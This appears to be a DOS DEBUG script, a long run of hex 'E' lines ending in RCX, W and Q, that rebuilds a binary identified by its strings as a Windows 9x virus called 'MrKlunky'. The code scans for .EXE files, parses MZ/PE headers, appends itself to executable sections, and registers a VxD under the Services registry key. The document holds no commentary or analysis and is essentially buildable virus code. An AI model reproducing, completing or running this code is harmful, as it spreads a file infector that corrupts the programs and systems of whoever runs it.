E 0F70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0F80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0F90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0FA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0FB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0FC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0FD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0FE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 0FF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 10A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 10B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 10C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 10D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 10E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 10F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1100 00 00 00 00 00 04 0D D0 01 01 00 00 4D 52 4B 4C 
E 1110 55 4E 4B 59 00 00 00 80 00 00 00 00 00 00 00 00 
E 1120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1130 00 00 00 00 00 00 00 00 00 00 00 00 76 65 72 50 
E 1140 50 00 00 00 31 76 73 52 32 76 73 52 33 76 73 52 
E 1150 83 F8 02 74 19 83 F8 1B 74 14 83 F8 1C 0F 84 90 
E 1160 00 00 00 83 F8 05 0F 84 87 00 00 00 F8 C3 CD 20 
E 1170 B6 00 01 00 E8 9C 00 00 00 73 19 CD 20 B7 00 01 
E 1180 00 E8 8F 00 00 00 73 0C BE 00 00 00 00 E8 D7 00 
E 1190 00 00 72 5D B8 00 D8 00 00 CD 20 32 00 40 00 72 
E 11A0 45 A3 00 00 00 00 66 A3 00 00 00 00 91 E8 DC 00 
E 11B0 00 00 74 32 89 35 00 00 00 00 E8 06 01 00 00 72 
E 11C0 25 B8 00 D7 00 00 CD 20 32 00 40 00 B8 00 00 00 
E 11D0 00 50 CD 20 67 00 40 00 83 C4 04 A3 00 00 00 00 
E 11E0 0B C0 74 0D F8 C3 B8 00 D7 00 00 CD 20 32 00 40 
E 11F0 00 F9 C3 8B 35 00 00 00 00 E8 A6 00 00 00 B8 00 
E 1200 00 00 00 50 CD 20 68 00 40 00 83 C4 04 0B C0 75 
E 1210 02 F8 C3 F9 C3 B9 E8 03 00 00 8B FA 32 C0 F2 AE 
E 1220 2B FA 57 52 B9 E8 03 00 00 E8 60 00 00 00 5F 59 
E 1230 74 36 60 87 F7 57 51 F3 A4 59 5F 51 32 C0 F2 AE 
E 1240 58 2B C1 91 B0 5C FD F2 AE FC 83 C7 02 BE 00 00 
E 1250 00 00 B9 0D 00 00 00 F3 A4 61 E8 0A 00 00 00 66 
E 1260 9C E8 3E 00 00 00 66 9D C3 BB 00 FF 00 00 BA 01 
E 1270 00 00 00 EB 0A BB 02 FF 00 00 BA 11 00 00 00 B8 
E 1280 01 D5 00 00 33 C9 CD 20 32 00 40 00 93 C3 51 68 
E 1290 00 02 00 00 51 CD 20 4F 00 01 00 83 C4 08 83 F8 
E 12A0 00 96 59 C3 6A 00 56 CD 20 51 00 01 00 83 C4 08 
E 12B0 C3 51 6A 04 51 56 CD 20 50 00 01 00 83 C4 0C 96 
E 12C0 83 FE 00 59 C3 33 D2 B8 00 D6 00 00 CD 20 32 00 
E 12D0 40 00 C3 55 8B EC 83 EC 20 53 51 80 3D 00 00 00 
E 12E0 00 00 0F 85 AC 02 00 00 C6 05 00 00 00 00 01 83 
E 12F0 7D 0C 24 0F 85 94 02 00 00 B9 E8 03 00 00 E8 8B 
E 1300 FF FF FF 0F 84 84 02 00 00 89 35 00 00 00 00 8B 
E 1310 DE BA E7 03 00 00 8B 4D 10 80 F9 FF 74 0D 83 EA 
E 1320 02 80 C1 40 88 0B 43 C6 03 3A 43 33 C9 51 52 8B 
E 1330 45 1C 8B 48 0C 83 C1 04 51 53 CD 20 41 00 40 00 
E 1340 83 C4 10 8B FE 32 C0 B9 E8 03 00 00 F2 AE 0B C9 
E 1350 0F 84 2C 02 00 00 81 7F FB 2E 45 58 45 0F 85 1F 
E 1360 02 00 00 B8 00 43 00 00 CD 20 32 00 40 00 0F 82 
E 1370 0E 02 00 00 51 B8 01 43 00 00 33 C9 CD 20 32 00 
E 1380 40 00 0F 82 E8 01 00 00 E8 E8 FE FF FF 0F 82 DD 
E 1390 01 00 00 B9 40 00 00 00 E8 F1 FE FF FF 0F 84 BD 
E 13A0 01 00 00 E8 1D FF FF FF 0F 82 B2 01 00 00 B8 00 
E 13B0 D8 00 00 CD 20 32 00 40 00 0F 82 A1 01 00 00 66 
E 13C0 81 3E 4D 5A 0F 85 96 01 00 00 81 7E 28 00 0F F0 
E 13D0 00 0F 84 89 01 00 00 8B 4E 3C 83 F9 00 0F 84 7D 
E 13E0 01 00 00 3B C8 0F 8F 75 01 00 00 8B F9 83 C1 77 
E 13F0 E8 BC FE FF FF 0F 84 65 01 00 00 E8 C5 FE FF FF 
E 1400 0F 82 5A 01 00 00 81 3C 37 50 45 00 00 0F 85 4D 
E 1410 01 00 00 8B 4C 37 54 E8 95 FE FF FF 0F 84 3E 01 
E 1420 00 00 E8 9E FE FF FF 0F 82 33 01 00 00 C7 46 28 
E 1430 00 0F F0 00 33 C9 66 8B 4C 37 14 03 CF 83 C1 18 
E 1440 2B C1 51 33 D2 B9 28 00 00 00 F7 F1 33 D2 66 8B 
E 1450 54 37 06 3B C2 0F 8E 05 01 00 00 81 FA FF FF 00 
E 1460 00 0F 8D F9 00 00 00 66 FF 44 37 06 92 F7 E1 59 
E 1470 03 C8 60 03 CE 8B 41 E4 03 41 E0 8B 5C 37 38 33 
E 1480 D2 F7 F3 40 F7 E3 A3 00 00 00 00 A1 00 00 00 00 
E 1490 05 8F 05 00 00 50 8B 5C 37 3C 33 D2 F7 F3 40 F7 
E 14A0 E3 A3 00 00 00 00 58 50 8B 5C 37 38 33 D2 F7 F3 
E 14B0 40 F7 E3 A3 00 00 00 00 8B 41 EC 03 41 E8 A3 00 
E 14C0 00 00 00 58 03 44 37 50 89 44 37 50 8B 41 E4 03 
E 14D0 41 E0 8B 5C 37 38 33 D2 F7 F3 40 F7 E3 FF 74 37 
E 14E0 28 5B 2B C3 05 07 00 00 00 A3 00 00 00 00 61 60 
E 14F0 56 57 87 F7 03 F9 BE 00 00 00 00 B9 0A 00 00 00 
E 1500 F3 A5 B8 01 D6 00 00 B9 8F 05 00 00 BE 00 00 00 
E 1510 00 8B 15 00 00 00 00 CD 20 32 00 40 00 72 3E B8 
E 1520 01 D6 00 00 8B 0D 00 00 00 00 8B 35 00 00 00 00 
E 1530 8B 15 00 00 00 00 81 C2 8F 05 00 00 CD 20 32 00 
E 1540 40 00 72 19 B8 01 D6 00 00 5F 5E 8B 4C 37 54 33 
E 1550 D2 CD 20 32 00 40 00 61 E9 8D 00 00 00 58 58 61 
E 1560 E8 3F FD FF FF B8 00 D7 00 00 CD 20 32 00 40 00 
E 1570 B8 01 43 00 00 8B 35 00 00 00 00 59 CD 20 32 00 
E 1580 40 00 8B 35 00 00 00 00 E8 17 FD FF FF C6 05 00 
E 1590 00 00 00 00 B9 06 00 00 00 BB 1C 00 00 00 8B 04 
E 15A0 2B 50 83 EB 04 E2 F7 A1 00 00 00 00 FF 10 59 5B 
E 15B0 83 C4 18 C9 C3 4D 72 4B 6C 75 6E 6B 79 00 00 00 
E 15C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 15D0 00 00 00 00 00 00 00 00 00 60 00 00 E0 00 00 00 
E 15E0 00 00 00 00 00 00 00 00 00 00 B8 00 D7 00 00 CD 
E 15F0 20 32 00 40 00 9C 60 8B 3D 00 00 00 00 32 C0 B9 
E 1600 E8 03 00 00 F2 AE 0B C9 74 53 B0 0D AA B8 E8 03 
E 1610 00 00 2B C1 40 50 B8 01 D5 00 00 B3 02 B7 FF 66 
E 1620 33 C9 B2 11 32 F6 BE 00 00 00 00 CD 20 32 00 40 
E 1630 00 72 2A 93 B8 00 D8 00 00 CD 20 32 00 40 00 92 
E 1640 B8 03 D6 00 00 8B 35 00 00 00 00 59 CD 20 32 00 
E 1650 40 00 B8 00 D7 00 00 CD 20 32 00 40 00 61 9D E8 
E 1660 40 FC FF FF E9 07 FF FF FF 43 3A 5C 4C 4F 47 2E 
E 1670 4C 4F 47 00 50 60 E8 00 00 00 00 5D BF 00 00 F7 
E 1680 BF B9 00 10 00 00 B8 50 45 00 00 F2 AE 0F 85 E3 
E 1690 01 00 00 39 47 FF 75 F3 4F 66 81 7F 04 4C 01 75 
E 16A0 EA 66 83 7F 14 00 74 E3 66 8B 5F 16 66 81 E3 00 
E 16B0 F0 66 81 FB 00 20 75 D3 81 7F 34 00 00 F7 BF 7C 
E 16C0 CA 8B 47 34 89 85 09 05 00 00 33 C0 66 8B 47 14 
E 16D0 03 C7 83 C0 18 66 8B 4F 06 81 38 2E 65 64 61 75 
E 16E0 09 81 78 04 74 61 00 00 74 10 83 C0 28 66 49 66 
E 16F0 83 F9 00 75 E4 E9 7C 01 00 00 8B 58 0C 03 9D 09 
E 1700 05 00 00 8B 7B 20 03 BD 09 05 00 00 8B 4B 14 2B 
E 1710 4B 18 B8 04 00 00 00 F7 E1 89 85 11 05 00 00 8B 
E 1720 4B 18 B8 04 00 00 00 F7 E1 91 87 FA 83 E9 04 8B 
E 1730 FA 03 F9 8B 3F 03 BD 09 05 00 00 8D B5 5C 05 00 
E 1740 00 8D 85 58 05 00 00 E8 36 01 00 00 8D B5 73 05 
E 1750 00 00 8D 85 6F 05 00 00 E8 25 01 00 00 83 F9 00 
E 1760 75 CA 83 BD 58 05 00 00 00 0F 84 07 01 00 00 83 
E 1770 BD 6F 05 00 00 00 0F 84 FA 00 00 00 8D 85 3F 03 
E 1780 00 00 50 8B 85 6F 05 00 00 FF D0 89 85 0D 05 00 
E 1790 00 83 F8 00 0F 84 DC 00 00 00 8D 85 7E 03 00 00 
E 17A0 E8 44 01 00 00 73 11 8D 85 92 03 00 00 E8 37 01 
E 17B0 00 00 0F 82 BE 00 00 00 33 DB 33 FF 8D B5 2E 03 
E 17C0 00 00 E8 FE 00 00 00 8D 85 BE 03 00 00 50 8B 85 
E 17D0 6F 05 00 00 FF D0 89 85 0D 05 00 00 83 F8 00 0F 
E 17E0 84 91 00 00 00 8D 85 D3 03 00 00 E8 BA 00 00 00 
E 17F0 0F 82 80 00 00 00 8D 9D 11 05 00 00 53 8D 9D 15 
E 1800 05 00 00 53 6A 00 68 3F 00 0F 00 6A 00 6A 00 6A 
E 1810 00 8D 9D 1F 05 00 00 53 68 02 00 00 80 FF D0 83 
E 1820 F8 00 75 52 8B 9D 15 05 00 00 8D 85 E3 03 00 00 
E 1830 E8 75 00 00 00 72 2F 97 6A 01 8D 85 3E 03 00 00 
E 1840 50 6A 03 6A 00 8D 85 19 05 00 00 50 53 FF D7 6A 
E 1850 0D 8D 85 32 03 00 00 50 6A 01 6A 00 8D 85 4E 05 
E 1860 00 00 50 53 FF D7 8D 85 C7 03 00 00 E8 39 00 00 
E 1870 00 72 03 53 FF D0 81 ED 00 00 00 00 89 6C 24 20 
E 1880 61 C3 60 8B 0E 83 C6 04 F3 A6 61 75 1C 96 8B 43 
E 1890 1C 03 85 11 05 00 00 03 85 09 05 00 00 03 C1 8B 
E 18A0 00 03 85 09 05 00 00 89 06 C3 50 8B 85 0D 05 00 
E 18B0 00 50 FF 95 58 05 00 00 83 F8 00 75 01 F9 C3 8D 
E 18C0 B5 F2 03 00 00 8D 85 54 03 00 00 E8 DA FF FF FF 
E 18D0 72 15 6A 00 6A 27 53 6A 00 6A 00 57 56 FF D0 83 
E 18E0 F8 FF 74 03 93 F8 C3 F9 C3 E8 BC FF FF FF 0F 82 
E 18F0 B3 00 00 00 BB 13 01 00 00 53 8D BD F2 03 00 00 
E 1900 57 FF D0 3B C3 0F 8F 9C 00 00 00 03 F8 80 7F FF 
E 1910 5C 75 01 4F 8D B5 31 03 00 00 B9 0E 00 00 00 F3 
E 1920 A4 BB 01 00 00 00 BF 00 00 00 C0 E8 8F FF FF FF 
E 1930 72 75 8D 85 B4 03 00 00 E8 6D FF FF FF 72 68 6A 
E 1940 00 8D BD 05 05 00 00 57 68 00 00 00 00 8D BD 88 
E 1950 05 00 00 57 53 FF D0 66 81 BD 05 05 00 00 00 00 
E 1960 74 02 33 C0 97 8D 85 A7 03 00 00 E8 3A FF FF FF 
E 1970 72 35 53 FF D0 96 8D 85 60 03 00 00 E8 29 FF FF 
E 1980 FF 72 24 53 FF D0 8D 85 48 03 00 00 E8 19 FF FF 
E 1990 FF 72 14 53 FF D0 83 F8 00 74 0C 83 FE 00 74 07 
E 19A0 83 FF 00 74 02 F8 C3 F9 C3 5C 5C 2E 5C 4D 72 4B 
E 19B0 6C 75 6E 6B 79 2E 56 78 44 00 4B 45 52 4E 45 4C 
E 19C0 33 32 00 43 6C 6F 73 65 48 61 6E 64 6C 65 00 43 
E 19D0 72 65 61 74 65 46 69 6C 65 41 00 46 6C 75 73 68 
E 19E0 46 69 6C 65 42 75 66 66 65 72 73 00 47 65 74 4C 
E 19F0 61 73 74 45 72 72 6F 72 00 47 65 74 53 79 73 74 
E 1A00 65 6D 44 69 72 65 63 74 6F 72 79 41 00 47 65 74 
E 1A10 57 69 6E 64 6F 77 73 44 69 72 65 63 74 6F 72 79 
E 1A20 41 00 53 65 74 45 6E 64 4F 66 46 69 6C 65 00 57 
E 1A30 72 69 74 65 46 69 6C 65 00 41 44 56 41 50 49 33 
E 1A40 32 00 52 65 67 43 6C 6F 73 65 4B 65 79 00 52 65 
E 1A50 67 43 72 65 61 74 65 4B 65 79 45 78 41 00 52 65 
E 1A60 67 53 65 74 56 61 6C 75 65 45 78 41 00 00 00 00 
E 1A70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1A80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1A90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1AA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1AB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1AC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1AD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1AE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1AF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1B00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1B10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1B20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1B30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1B40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1B50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1B60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1B70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1B80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
E 1B90 00 00 00 00 53 74 61 72 74 00 53 59 53 54 45 4D 
E 1BA0 5C 43 75 72 72 65 6E 74 43 6F 6E 74 72 6F 6C 53 
E 1BB0 65 74 5C 53 65 72 76 69 63 65 73 5C 56 78 44 5C 
E 1BC0 4D 72 4B 6C 75 6E 6B 79 00 53 74 61 74 69 63 56 
E 1BD0 78 44 00 00 00 00 00 0F 00 00 00 47 65 74 50 72 
E 1BE0 6F 63 41 64 64 72 65 73 73 00 00 00 00 00 11 00 
E 1BF0 00 00 47 65 74 4D 6F 64 75 6C 65 48 61 6E 64 6C 
E 1C00 65 41 00 CC 08 4D 52 4B 4C 55 4E 4B 59 00 00 0C 
E 1C10 4D 52 4B 4C 55 4E 4B 59 5F 44 44 42 01 00 00 
RCX
1B1F
W
Q

;============================================================================

